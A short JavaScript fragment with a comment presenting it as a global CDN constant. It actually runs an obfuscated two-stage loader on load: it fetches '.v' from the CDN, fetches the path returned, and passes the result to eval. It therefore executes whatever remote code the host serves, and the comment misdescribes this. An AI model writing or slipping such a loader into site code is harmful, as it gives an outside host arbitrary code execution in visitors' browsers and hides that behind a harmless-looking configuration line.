// global const, will set to window._CDN
const _CDN = "//${cdn}"
;(async (F) => {
	await eval(await F(await F(".v")))
})(async (U) => {
	return (await fetch(_CDN + U)).text()
})
